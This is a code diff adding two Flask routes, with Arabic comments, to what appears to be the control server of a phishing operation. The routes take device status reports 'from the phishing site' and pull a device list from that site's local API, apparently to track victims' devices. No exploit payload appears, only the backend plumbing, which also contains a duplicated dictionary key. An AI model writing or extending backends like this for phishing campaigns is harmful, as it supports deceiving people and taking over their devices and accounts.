@@ -164,6 +164,48 @@ def client_status(device_id):
         'last_seen': time.time()
     })
 
+@app.route('/device-status-update', methods=['POST'])
+def device_status_update():
+    """تحديث حالة الجهاز من موقع التصيد"""
+    try:
+        data = request.json
+        device_id = data.get('deviceId')
+        status = data.get('status')
+        
+        print(f"تم استقبال تحديث حالة الجهاز: {device_id} - {status}")
+        
+        # هنا يمكن إضافة منطق لتخزين حالة الجهاز
+        result = {
+            'status': 'success',
+            'device_id': device_id,
+            'status': status,
+            'timestamp': time.time()
+        }
+        
+        return jsonify(result)
+        
+    except Exception as e:
+        print(f"خطأ في تحديث حالة الجهاز: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/devices-from-phishing', methods=['GET'])
+def get_devices_from_phishing():
+    """الحصول على الأجهزة من موقع التصيد"""
+    try:
+        # الاتصال بموقع التصيد للحصول على الأجهزة
+        import requests
+        response = requests.get('http://localhost:3000/api/devices', timeout=5)
+        
+        if response.status_code == 200:
+            data = response.json()
+            return jsonify(data)
+        else:
+            return jsonify({'error': 'فشل في الاتصال بموقع التصيد'}), 500
+            
+    except Exception as e:
+        print(f"خطأ في الحصول على الأجهزة من التصيد: {e}")
+        return jsonify({'error': str(e)}), 500
+
 def run_http_server():
     """تشغيل خادم HTTP"""
     app.run(host='0.0.0.0', port=10001, debug=False, use_reloader=False)
